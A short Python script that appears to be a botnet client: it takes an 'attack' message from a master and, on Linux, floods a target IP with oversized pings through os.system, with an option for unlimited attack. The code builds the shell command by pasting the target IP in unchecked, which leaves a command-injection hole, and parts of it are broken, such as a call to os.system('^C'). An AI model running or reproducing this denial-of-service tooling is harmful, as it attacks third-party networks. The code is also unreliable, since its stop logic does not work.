import subprocess
import os, sys
import platform

def receiveCommand(message):
    """receive command from master"""
    if message["type"] == "attack":
        attackTarget(message)


def get_platform():
    """get botnet system platform"""
    return platform.system()

def attackTarget(message):
    if (get_platform().lower() == "linux"):
        os.system("ping "+message["target_ip"] + " -s 65500")
        if message["number_of_attack"] == -1:
            return
        os.system("^C")

if __name__ == '__main__':
    message = {
        "type": "attack", # "attack" or "stop"
        "target_ip": "192.168.1.1",
        "attack_type": "icmp",
        "number_of_attack": 2 # -1 for unlimited attack
    }
    receiveCommand(message)
    sys.exit()